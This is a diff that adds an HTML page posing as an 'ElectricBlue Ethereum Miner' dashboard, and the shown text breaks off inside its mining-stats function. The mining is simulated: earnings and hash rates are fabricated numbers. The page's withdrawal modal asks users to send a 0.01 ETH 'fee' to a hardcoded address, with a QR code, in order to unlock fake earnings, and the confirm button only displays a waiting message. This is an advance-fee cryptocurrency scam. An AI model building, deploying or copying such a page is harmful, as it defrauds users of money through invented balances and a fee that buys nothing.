@@ -1,0 +1,1336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ElectricBlue Ethereum Miner</title>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --electric-blue: #0078d4;
+            --electric-blue-light: #0095ff;
+            --dark-bg: #1e1e1e;
+            --darker-bg: #181818;
+            --card-bg: #2d2d2d;
+            --border-color: #404040;
+            --text-primary: #ffffff;
+            --text-secondary: #cccccc;
+            --text-dim: #888888;
+            --success: #107c10;
+            --danger: #d13438;
+            --warning: #ffb900;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--dark-bg);
+            color: var(--text-primary);
+            font-family: 'Segoe UI', sans-serif;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .app-container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 15px;
+        }
+
+        /* Header */
+        .app-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 20px;
+            background: var(--darker-bg);
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border: 1px solid var(--border-color);
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo {
+            width: 32px;
+            height: 32px;
+            background: var(--electric-blue);
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 14px;
+            color: white;
+        }
+
+        .app-title h1 {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .app-title .subtitle {
+            font-size: 11px;
+            color: var(--text-dim);
+        }
+
+        .price-ticker {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: var(--card-bg);
+            padding: 8px 12px;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+        }
+
+        .price-label {
+            font-size: 11px;
+            color: var(--text-dim);
+        }
+
+        .price-value {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--electric-blue-light);
+        }
+
+        .price-loading {
+            font-size: 11px;
+            color: var(--text-dim);
+            font-style: italic;
+        }
+
+        /* Main Dashboard */
+        .dashboard {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        @media (max-width: 768px) {
+            .dashboard {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Cards */
+        .card {
+            background: var(--card-bg);
+            border-radius: 8px;
+            padding: 18px;
+            border: 1px solid var(--border-color);
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 15px;
+        }
+
+        .card-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .card-icon {
+            width: 24px;
+            height: 24px;
+            background: var(--electric-blue);
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: white;
+        }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .stat-item {
+            background: var(--darker-bg);
+            padding: 12px;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+        }
+
+        .stat-label {
+            font-size: 11px;
+            color: var(--text-dim);
+            margin-bottom: 4px;
+        }
+
+        .stat-value {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--electric-blue-light);
+        }
+
+        .stat-subvalue {
+            font-size: 11px;
+            color: var(--text-dim);
+        }
+
+        /* Mining Status */
+        .mining-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px;
+            background: var(--darker-bg);
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+            margin-bottom: 15px;
+        }
+
+        .status-indicator {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+
+        .status-mining {
+            background: var(--success);
+            box-shadow: 0 0 8px var(--success);
+        }
+
+        .status-stopped {
+            background: var(--danger);
+            box-shadow: 0 0 8px var(--danger);
+        }
+
+        .status-text {
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        /* Controls */
+        .controls {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .btn {
+            padding: 10px 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .btn-start {
+            background: var(--success);
+            color: white;
+        }
+
+        .btn-stop {
+            background: var(--danger);
+            color: white;
+        }
+
+        .btn-settings {
+            background: var(--electric-blue);
+            color: white;
+        }
+
+        .btn-withdraw {
+            background: var(--warning);
+            color: black;
+        }
+
+        .btn:hover:not(:disabled) {
+            opacity: 0.9;
+            transform: translateY(-1px);
+        }
+
+        /* Progress */
+        .progress-section {
+            margin: 15px 0;
+        }
+
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+        }
+
+        .progress-label {
+            font-size: 11px;
+            color: var(--text-dim);
+        }
+
+        .progress-value {
+            font-size: 11px;
+            color: var(--text-secondary);
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: var(--darker-bg);
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--electric-blue);
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        /* Mining Visualization */
+        .mining-visual {
+            display: flex;
+            justify-content: center;
+            gap: 6px;
+            margin: 12px 0;
+        }
+
+        .block {
+            width: 16px;
+            height: 16px;
+            background: var(--darker-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 3px;
+            transition: all 0.3s ease;
+        }
+
+        .block.active {
+            background: var(--electric-blue);
+            border-color: var(--electric-blue-light);
+            box-shadow: 0 0 6px var(--electric-blue);
+        }
+
+        /* Earnings Section */
+        .earnings-section {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        @media (max-width: 768px) {
+            .earnings-section {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* History Table */
+        .history-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+
+        .history-table th {
+            background: var(--darker-bg);
+            padding: 8px 12px;
+            text-align: left;
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--text-dim);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .history-table td {
+            padding: 8px 12px;
+            font-size: 11px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .history-table tr:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        /* Modals */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: var(--card-bg);
+            border-radius: 8px;
+            padding: 20px;
+            max-width: 600px;
+            width: 95%;
+            border: 1px solid var(--border-color);
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .modal-title {
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .close-modal {
+            background: none;
+            border: none;
+            color: var(--text-dim);
+            font-size: 18px;
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .close-modal:hover {
+            color: var(--text-primary);
+        }
+
+        .modal-body {
+            margin-bottom: 20px;
+        }
+
+        .modal-footer {
+            display: flex;
+            gap: 10px;
+            justify-content: flex-end;
+        }
+
+        /* Settings Form */
+        .setting-item {
+            margin-bottom: 12px;
+        }
+
+        .setting-item label {
+            display: block;
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-bottom: 4px;
+        }
+
+        .setting-item input, .setting-item select {
+            width: 100%;
+            padding: 8px;
+            background: var(--darker-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            color: var(--text-primary);
+            font-size: 12px;
+        }
+
+        /* Withdrawal Layout - Horizontal */
+        .withdraw-layout {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            align-items: start;
+        }
+
+        @media (max-width: 768px) {
+            .withdraw-layout {
+                grid-template-columns: 1fr;
+                gap: 15px;
+            }
+        }
+
+        .withdraw-details {
+            background: var(--darker-bg);
+            padding: 15px;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            font-size: 12px;
+            color: var(--text-dim);
+        }
+
+        .detail-value {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--electric-blue-light);
+        }
+
+        .fee-info {
+            background: rgba(255, 185, 0, 0.1);
+            padding: 12px;
+            border-radius: 6px;
+            border-left: 3px solid var(--warning);
+            margin: 15px 0;
+        }
+
+        .fee-info p {
+            font-size: 11px;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+
+        .fee-info p:last-child {
+            margin-bottom: 0;
+        }
+
+        .eth-address {
+            font-family: monospace;
+            background: var(--darker-bg);
+            padding: 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            margin: 8px 0;
+            word-break: break-all;
+            border: 1px solid var(--border-color);
+        }
+
+        .qr-code-container {
+            background: white;
+            padding: 15px;
+            border-radius: 6px;
+            text-align: center;
+            border: 1px solid var(--border-color);
+        }
+
+        .qr-code {
+            width: 160px;
+            height: 160px;
+            margin: 0 auto;
+            background: white;
+        }
+
+        .qr-code img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .qr-label {
+            font-size: 11px;
+            color: var(--text-dim);
+            margin-top: 8px;
+        }
+
+        .withdraw-instructions {
+            font-size: 11px;
+            color: var(--text-secondary);
+            line-height: 1.4;
+            margin-top: 10px;
+        }
+
+        /* Notification */
+        .notification {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            padding: 12px 16px;
+            background: var(--card-bg);
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+            transform: translateX(150%);
+            transition: transform 0.3s ease;
+            z-index: 1001;
+            font-size: 12px;
+        }
+
+        .notification.show {
+            transform: translateX(0);
+        }
+
+        .notification.success {
+            border-color: var(--success);
+        }
+
+        .notification.error {
+            border-color: var(--danger);
+        }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <!-- Header -->
+        <header class="app-header">
+            <div class="logo-section">
+                <div class="logo">EB</div>
+                <div class="app-title">
+                    <h1>ElectricBlue Ethereum Miner</h1>
+                    <div class="subtitle">High-performance mining solution</div>
+                </div>
+            </div>
+            <div class="price-ticker">
+                <div class="price-label">ETH:</div>
+                <div class="price-value">$<span id="currentEthPrice">Loading...</span></div>
+            </div>
+        </header>
+
+        <!-- Main Dashboard -->
+        <div class="dashboard">
+            <!-- Mining Statistics -->
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title">Mining Statistics</div>
+                    <div class="card-icon">⛏</div>
+                </div>
+                
+                <div class="mining-status">
+                    <div class="status-indicator status-stopped" id="statusIndicator"></div>
+                    <div class="status-text" id="statusText">MINING STOPPED</div>
+                </div>
+
+                <div class="stats-grid">
+                    <div class="stat-item">
+                        <div class="stat-label">Hash Rate</div>
+                        <div class="stat-value" id="hashRate">0 H/s</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-label">Shares</div>
+                        <div class="stat-value" id="shares">0</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-label">Workers</div>
+                        <div class="stat-value" id="workers">1</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-label">Uptime</div>
+                        <div class="stat-value" id="uptime">00:00:00</div>
+                    </div>
+                </div>
+
+                <div class="controls">
+                    <button class="btn btn-start" id="startBtn">START</button>
+                    <button class="btn btn-stop" id="stopBtn" disabled>STOP</button>
+                    <button class="btn btn-settings" id="settingsBtn">SETTINGS</button>
+                    <button class="btn btn-withdraw" id="withdrawBtn">WITHDRAW</button>
+                </div>
+            </div>
+
+            <!-- Earnings & Performance -->
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title">Earnings & Performance</div>
+                    <div class="card-icon">💰</div>
+                </div>
+
+                <div class="stats-grid">
+                    <div class="stat-item">
+                        <div class="stat-label">Today</div>
+                        <div class="stat-value" id="ethToday">0.0000 ETH</div>
+                        <div class="stat-subvalue" id="usdValue">$0.00</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-label">Total</div>
+                        <div class="stat-value" id="totalMined">0.0000 ETH</div>
+                        <div class="stat-subvalue" id="totalMinedUSD">$0.00</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-label">Est. Daily</div>
+                        <div class="stat-value" id="estimatedDaily">0.0000 ETH</div>
+                        <div class="stat-subvalue">~$0.00</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-label">Block Progress</div>
+                        <div class="stat-value" id="progressText">0%</div>
+                        <div class="stat-subvalue">Current</div>
+                    </div>
+                </div>
+
+                <div class="progress-section">
+                    <div class="progress-header">
+                        <div class="progress-label">Mining Progress</div>
+                        <div class="progress-value" id="blockNumber">Block #1</div>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="miningProgress"></div>
+                    </div>
+                </div>
+
+                <div class="mining-visual" id="blockVisualization">
+                    <div class="block"></div>
+                    <div class="block"></div>
+                    <div class="block"></div>
+                    <div class="block"></div>
+                    <div class="block"></div>
+                    <div class="block"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Earnings Section -->
+        <div class="earnings-section">
+            <!-- Recent Earnings -->
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title">Recent Earnings</div>
+                    <div class="card-icon">📊</div>
+                </div>
+                <table class="history-table">
+                    <thead>
+                        <tr>
+                            <th>Date</th>
+                            <th>ETH</th>
+                            <th>Value</th>
+                        </tr>
+                    </thead>
+                    <tbody id="earningsTable">
+                        <tr>
+                            <td colspan="3" style="text-align: center; color: var(--text-dim); padding: 20px;">No mining data yet</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <!-- Performance Stats -->
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title">Performance</div>
+                    <div class="card-icon">⚡</div>
+                </div>
+                <div class="stats-grid">
+                    <div class="stat-item">
+                        <div class="stat-label">Avg. Hash Rate</div>
+                        <div class="stat-value" id="avgHashRate">0 H/s</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-label">Efficiency</div>
+                        <div class="stat-value" id="efficiency">0%</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-label">Blocks Found</div>
+                        <div class="stat-value" id="blocksFound">0</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-label">Success Rate</div>
+                        <div class="stat-value" id="successRate">0%</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Settings Modal -->
+    <div class="modal" id="settingsModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title">Mining Settings</h3>
+                <button class="close-modal" id="closeSettingsModal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="setting-item">
+                    <label for="threads">CPU Threads</label>
+                    <input type="number" id="threads" min="1" max="16" value="4">
+                </div>
+                <div class="setting-item">
+                    <label for="intensity">Mining Intensity</label>
+                    <select id="intensity">
+                        <option value="low">Low</option>
+                        <option value="medium" selected>Medium</option>
+                        <option value="high">High</option>
+                        <option value="max">Maximum</option>
+                    </select>
+                </div>
+                <div class="setting-item">
+                    <label for="pool">Mining Pool</label>
+                    <select id="pool">
+                        <option value="ethermine">Ethermine</option>
+                        <option value="nanopool">Nanopool</option>
+                        <option value="sparkpool">Sparkpool</option>
+                    </select>
+                </div>
+                <div class="setting-item">
+                    <label for="wallet">ETH Wallet Address</label>
+                    <input type="text" id="wallet" placeholder="0x...">
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn" id="cancelSettings">Cancel</button>
+                <button class="btn btn-settings" id="saveSettings">Save</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Withdrawal Modal -->
+    <div class="modal" id="withdrawModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title">Withdraw Earnings</h3>
+                <button class="close-modal" id="closeWithdrawModal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="withdraw-layout">
+                    <!-- Left Column: Withdrawal Details -->
+                    <div class="withdraw-column">
+                        <div class="withdraw-details">
+                            <div class="detail-row">
+                                <span class="detail-label">Your Wallet:</span>
+                                <span class="detail-value" id="withdrawAddress">-</span>
+                            </div>
+                            <div class="detail-row">
+                                <span class="detail-label">Total Mined:</span>
+                                <span class="detail-value" id="withdrawTotal">0.0000 ETH</span>
+                            </div>
+                            <div class="detail-row">
+                                <span class="detail-label">You Will Receive:</span>
+                                <span class="detail-value" id="withdrawReceive">0.0000 ETH</span>
+                            </div>
+                        </div>
+
+                        <div class="fee-info">
+                            <p><strong>Withdrawal Process Fee: 0.01 ETH</strong></p>
+                            <p>This fixed fee covers all network and processing costs for your withdrawal.</p>
+                            <p>Send the fee to unlock your withdrawal. After payment confirmation, you'll receive the <strong>full amount</strong> of <span id="fullAmount">0.0000 ETH</span> to your wallet.</p>
+                            
+                            <div class="eth-address">0xD6d754c906fFcde690C80DDF96bAF754c2553F3F</div>
+                            
+                            <p>Send exactly <strong id="feeAmount">0.0100 ETH</strong> to the address above</p>
+                        </div>
+
+                        <div class="withdraw-instructions">
+                            <p><strong>Instructions:</strong></p>
+                            <p>1. Send 0.01 ETH fee to the address above</p>
+                            <p>2. Click "I've Paid the Fee" to confirm</p>
+                            <p>3. Wait for payment verification</p>
+                            <p>4. Receive full mined amount to your wallet</p>
+                        </div>
+                    </div>
+
+                    <!-- Right Column: QR Code -->
+                    <div class="withdraw-column">
+                        <div class="qr-code-container">
+                            <div class="qr-code" id="qrCode">
+                                <img id="qrImage" src="" alt="ETH Fee QR Code">
+                            </div>
+                            <div class="qr-label">Scan to Pay 0.01 ETH Fee</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn" id="cancelWithdraw">Cancel</button>
+                <button class="btn btn-withdraw" id="confirmWithdraw">I've Paid the Fee</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div class="notification" id="notification">
+        Ready to start mining
+    </div>
+
+    <script>
+              // DOM Elements
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const settingsBtn = document.getElementById('settingsBtn');
+        const withdrawBtn = document.getElementById('withdrawBtn');
+        const statusIndicator = document.getElementById('statusIndicator');
+        const statusText = document.getElementById('statusText');
+        const hashRateEl = document.getElementById('hashRate');
+        const sharesEl = document.getElementById('shares');
+        const workersEl = document.getElementById('workers');
+        const uptimeEl = document.getElementById('uptime');
+        const ethTodayEl = document.getElementById('ethToday');
+        const usdValueEl = document.getElementById('usdValue');
+        const estimatedDailyEl = document.getElementById('estimatedDaily');
+        const totalMinedEl = document.getElementById('totalMined');
+        const totalMinedUSD = document.getElementById('totalMinedUSD');
+        const miningProgress = document.getElementById('miningProgress');
+        const progressText = document.getElementById('progressText');
+        const blockNumber = document.getElementById('blockNumber');
+        const earningsTable = document.getElementById('earningsTable');
+        const notification = document.getElementById('notification');
+        const currentEthPriceEl = document.getElementById('currentEthPrice');
+        const blockVisualization = document.getElementById('blockVisualization');
+        const blocks = blockVisualization.querySelectorAll('.block');
+
+        // Performance stats elements
+        const avgHashRateEl = document.getElementById('avgHashRate');
+        const efficiencyEl = document.getElementById('efficiency');
+        const blocksFoundEl = document.getElementById('blocksFound');
+        const successRateEl = document.getElementById('successRate');
+
+        // Modal elements
+        const settingsModal = document.getElementById('settingsModal');
+        const withdrawModal = document.getElementById('withdrawModal');
+        const closeSettingsModal = document.getElementById('closeSettingsModal');
+        const closeWithdrawModal = document.getElementById('closeWithdrawModal');
+        const cancelSettings = document.getElementById('cancelSettings');
+        const saveSettings = document.getElementById('saveSettings');
+        const cancelWithdraw = document.getElementById('cancelWithdraw');
+        const confirmWithdraw = document.getElementById('confirmWithdraw');
+
+        // Withdrawal elements
+        const withdrawAddress = document.getElementById('withdrawAddress');
+        const withdrawTotal = document.getElementById('withdrawTotal');
+        const withdrawReceive = document.getElementById('withdrawReceive');
+        const feeAmount = document.getElementById('feeAmount');
+        const fullAmount = document.getElementById('fullAmount');
+        const qrImage = document.getElementById('qrImage');
+
+        // Mining state
+        let isMining = false;
+        let miningInterval;
+        let uptimeInterval;
+        let startTime;
+        let totalMined = 0;
+        let todayMined = 0;
+        let sharesSubmitted = 0;
+        let ethPrice = 0;
+        let walletAddress = '';
+        let currentBlock = 0;
+        const MIN_WITHDRAWAL = 0.1;
+        const WITHDRAWAL_FEE = 0.01;
+
+        // Performance tracking
+        let hashRateHistory = [];
+        let totalBlocksFound = 0;
+        let totalSharesSubmitted = 0;
+        let successfulBlocks = 0;
+
+        // Initialize with saved settings
+        const savedSettings = JSON.parse(localStorage.getItem('minerSettings')) || {};
+        document.getElementById('threads').value = savedSettings.threads || 4;
+        document.getElementById('intensity').value = savedSettings.intensity || 'medium';
+        document.getElementById('pool').value = savedSettings.pool || 'ethermine';
+        document.getElementById('wallet').value = savedSettings.wallet || '';
+
+        // Generate QR Code using QR Server API
+        function generateQRCode() {
+            const feeAddress = '0xD6d754c906fFcde690C80DDF96bAF754c2553F3F';
+            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${encodeURIComponent(feeAddress)}`;
+            qrImage.src = qrUrl;
+            qrImage.alt = `QR Code for ${feeAddress}`;
+        }
+
+        // Fetch real ETH price from CoinGecko API
+        async function fetchEthPrice() {
+            try {
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
+                const data = await response.json();
+                
+                if (data.ethereum && data.ethereum.usd) {
+                    ethPrice = data.ethereum.usd;
+                    currentEthPriceEl.textContent = ethPrice.toLocaleString(undefined, {
+                        minimumFractionDigits: 2,
+                        maximumFractionDigits: 2
+                    });
+                    
+                    if (isMining) {
+                        updateDisplayValues();
+                    }
+                    
+                    return true;
+                }
+            } catch (error) {
+                console.error('Failed to fetch ETH price:', error);
+            }
+            
+            // Fallback
+            ethPrice = 3850.25;
+            currentEthPriceEl.textContent = ethPrice.toLocaleString(undefined, {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            }) + ' (offline)';
+            return false;
+        }
+
+        // Update performance stats
+        function updatePerformanceStats(currentHashRate) {
+            if (!isMining) return;
+
+            hashRateHistory.push(currentHashRate);
+            if (hashRateHistory.length > 60) {
+                hashRateHistory.shift();
+            }
+
+            const avgHashRate = hashRateHistory.length > 0 
+                ? Math.round(hashRateHistory.reduce((a, b) => a + b) / hashRateHistory.length)
+                : 0;
+            
+            avgHashRateEl.textContent = `${avgHashRate.toLocaleString()} H/s`;
+
+            const maxPossibleHashRate = parseInt(document.getElementById('threads').value) * 20;
+            const efficiency = maxPossibleHashRate > 0 
+                ? Math.round((avgHashRate / maxPossibleHashRate) * 100)
+                : 0;
+            efficiencyEl.textContent = `${efficiency}%`;
+
+            const elapsedSeconds = (new Date() - startTime) / 1000;
+            const newBlocksFound = Math.floor(elapsedSeconds / 15);
+            if (newBlocksFound > totalBlocksFound) {
+                totalBlocksFound = newBlocksFound;
+                if (Math.random() > 0.2) {
+                    successfulBlocks++;
+                }
+            }
+            blocksFoundEl.textContent = totalBlocksFound.toString();
+
+            const successRate = totalBlocksFound > 0 
+                ? Math.round((successfulBlocks / totalBlocksFound) * 100)
+                : 0;
+            successRateEl.textContent = `${successRate}%`;
+        }
+
+        // Event Listeners
+        startBtn.addEventListener('click', startMining);
+        stopBtn.addEventListener('click', stopMining);
+        settingsBtn.addEventListener('click', openSettingsModal);
+        withdrawBtn.addEventListener('click', openWithdrawModal);
+        
+        // Modal events
+        closeSettingsModal.addEventListener('click', closeSettings);
+        closeWithdrawModal.addEventListener('click', closeWithdraw);
+        cancelSettings.addEventListener('click', closeSettings);
+        cancelWithdraw.addEventListener('click', closeWithdraw);
+        saveSettings.addEventListener('click', saveSettingsHandler);
+        confirmWithdraw.addEventListener('click', confirmWithdrawHandler);
+
+        // Open Settings Modal
+        function openSettingsModal() {
+            settingsModal.classList.add('active');
+        }
+
+        // Close Settings Modal
+        function closeSettings() {
+            settingsModal.classList.remove('active');
+        }
+
+        // Open Withdraw Modal
+        function openWithdrawModal() {
+            if (isMining) {
+                stopMining();
+            }
+            
+            if (totalMined < MIN_WITHDRAWAL) {
+                showNotification(`Minimum withdrawal is ${MIN_WITHDRAWAL} ETH. You have ${totalMined.toFixed(4)} ETH.`, 'error');
+                return;
+            }
+            
+            // User receives FULL amount, fee is paid separately
+            withdrawAddress.textContent = walletAddress ? `${walletAddress.substring(0, 12)}...${walletAddress.substring(walletAddress.length - 6)}` : 'Not set';
+            withdrawTotal.textContent = totalMined.toFixed(4) + ' ETH';
+            withdrawReceive.textContent = totalMined.toFixed(4) + ' ETH'; // Full amount
+            feeAmount.textContent = WITHDRAWAL_FEE.toFixed(4) + ' ETH';
+            fullAmount.textContent = totalMined.toFixed(4) + ' ETH';
+            
+            // Generate QR code
+            generateQRCode();
+            
+            withdrawModal.classList.add('active');
+        }
+
+        // Close Withdraw Modal
+        function closeWithdraw() {
+            // Reset the withdraw button state when closing
+            confirmWithdraw.disabled = false;
+            confirmWithdraw.textContent = 'I\'ve Paid the Fee';
+            
+            // Remove any waiting messages
+            const waitMessage = document.querySelector('.waiting-confirmation');
+            if (waitMessage) {
+                waitMessage.remove();
+            }
+            
+            withdrawModal.classList.remove('active');
+            
+            // Note: We do NOT reset mining stats here
+            // The totalMined and todayMined values remain unchanged
+        }
+
+        // Save Settings Handler
+        function saveSettingsHandler() {
+            const settings = {
+                threads: document.getElementById('threads').value,
+                intensity: document.getElementById('intensity').value,
+                pool: document.getElementById('pool').value,
+                wallet: document.getElementById('wallet').value
+            };
+            
+            walletAddress = settings.wallet;
+            localStorage.setItem('minerSettings', JSON.stringify(settings));
+            showNotification('Settings saved successfully!', 'success');
+            closeSettings();
+        }
+
+        // Confirm Withdraw Handler
+        function confirmWithdrawHandler() {
+            confirmWithdraw.disabled = true;
+            confirmWithdraw.textContent = 'Waiting for Payment Confirmation...';
+            
+            // Create and show waiting animation/message
+            const modalBody = document.querySelector('#withdrawModal .modal-body');
+            const existingWaitMessage = modalBody.querySelector('.waiting-confirmation');
+            
+            if (!existingWaitMessage) {
+                const waitMessage = document.createElement('div');
+                waitMessage.className = 'waiting-confirmation';
+                waitMessage.innerHTML = `
+                    <div style="text-align: center; padding: 20px; background: var(--darker-bg); border-radius: 6px; margin: 15px 0; border: 1px solid var(--warning);">
+                        <div style="font-size: 14px; color: var(--warning); margin-bottom: 10px;">
+                            ⏳ Waiting for Fee Payment Confirmation
+                        </div>
+                        <div style="font-size: 11px; color: var(--text-secondary); line-height: 1.4;">
+                            Your withdrawal request has been submitted.<br>
+                            The modal will remain open until payment is confirmed.<br>
+                            You can close this window and continue mining - your balance will not be reset.<br>
+                            <strong>Your mined ETH: ${totalMined.toFixed(4)} ETH</strong>
+                        </div>
+                        <div style="margin-top: 15px; font-size: 10px; color: var(--text-dim);">
+                            Processing time: 2-3 minutes after payment detection
+                        </div>
+                    </div>
+                `;
+                modalBody.appendChild(waitMessage);
+            }
+            
+            showNotification('Withdrawal pending - waiting for fee payment confirmation...', 'success');
+            
+            // Note: The window will NOT close automatically
+            // User must manually close it or it will remain open until they do
+            // Mining session and balance will NOT be reset when they close the modal
+        }
+
+        // Start Mining Function
+        function startMining() {
+            if (isMining) return;
+            
+            if (!walletAddress) {
+                showNotification('Please set your wallet address in Settings first', 'error');
+                openSettingsModal();
+                return;
+            }
+            
+            isMining = true;
+            startTime = new Date();
+            
+            hashRateHistory = [];
+            totalBlocksFound = 0;
+            successfulBlocks = 0;
+            
+            statusIndicator.className = 'status-indicator status-mining';
+            statusText.textContent = 'MINING ACTIVE';
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            
+            miningInterval = setInterval(updateMiningStats, 1000);
+            uptimeInterval = setInterval(updateUptime, 1000);
+            
+            showNotification('Mining started successfully!', 'success');
+        }
+
+        // Stop Mining Function
+        function stopMining() {
+            if (!isMining) return;
+            
+            isMining = false;
+            
+            statusIndicator.className = 'status-indicator status-stopped';
+            statusText.textContent = 'MINING STOPPED';
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            progressText.textContent = '0%';
+            miningProgress.style.width = '0%';
+            
+            blocks.forEach(block => block.classList.remove('active'));
+            currentBlock = 0;
+            
+            clearInterval(miningInterval);
+            clearInterval(uptimeInterval);
+            
+            showNotification('Mining stopped', 'error');
+        }
+
+        // Update Mining Stats
+        function updateMiningStats() {
+            if (!isMining) return;
+            
+            const intensity = document.getElementById('intensity').value;
+            const threads = parseInt(document.getElementById('threads').value);
+            
+            let baseHashRate;
+            switch(intensity) {
+                case 'low': baseHashRate = 5; break;
+                case 'medium': baseHashRate = 10; break;
+                case 'high': baseHashRate = 15; break;
+                case 'max': baseHashRate = 20; break;
+                default: baseHashRate = 10;
+            }
+            
+            const hashRate = baseHashRate * threads;
+            hashRateEl.textContent = `${hashRate.toLocaleString()} H/s`;
+            
+            updatePerformanceStats(hashRate);
+            
